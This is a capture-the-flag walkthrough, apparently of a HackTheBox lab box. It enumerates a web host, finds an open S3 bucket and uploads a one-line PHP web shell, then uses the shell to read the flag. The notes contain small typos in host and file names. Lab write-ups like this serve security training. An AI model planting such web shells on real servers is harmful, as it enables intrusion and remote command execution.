`nmap -sv {target_ip}`

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV 10.129.75.118 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-26 15:26 EST
Nmap scan report for thetoppers.htb (10.129.75.118)
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds
```
`sudo nano /etc/hosts`

Add:

`10.129.75.118 thetoppers.htb`

`gobuster vhost -w SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb`

Found dns:

`s3.thetroppers.htb`

add to etc/hosts
`10.129.75.118 s3.thetoppers.htb`

```
┌──(kali㉿kali)-[~]
└─$ aws configure                 
AWS Access Key ID [****************a]: a
AWS Secret Access Key [****************a]: a
Default region name [a]: a
Default output format [a]: a
```

```
┌──(kali㉿kali)-[~]
└─$ aws s3 ls s3://thetroppers.htb

Could not connect to the endpoint URL: "https://s3.a.amazonaws.com/thetroppers.htb?list-type=2&prefix=&delimiter=%2F&encoding-type=url"
```

```
┌──(kali㉿kali)-[~]
└─$ aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb
                           PRE images/
2022-11-26 15:04:11          0 .htaccess
2022-11-26 15:04:11      11952 index.php
```

```
cd Desktop
sudo nano shell.php
file: <?php system($ GET['cmd']); ?>
```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3 --endpoint=http://s3.thetoppers.htb cp shell.php s3://thetoppers.htb/shell.php
upload: ./shell.php to s3://thetoppers.htb/shell.php 
```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb           
                           PRE images/
2022-11-26 15:04:11          0 .htaccess
2022-11-26 15:04:11      11952 index.php
2022-11-26 15:39:59         31 shell.php
```

```
http://thetoppers.htb/shell2.php?cmd=ls
images index.php shell.php shell2.php 
```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl http://thetoppers.htb/shell2.php?cmd=cat+../flag.txt 
a980d99281a28d638ac68b9bf9453c2b
```







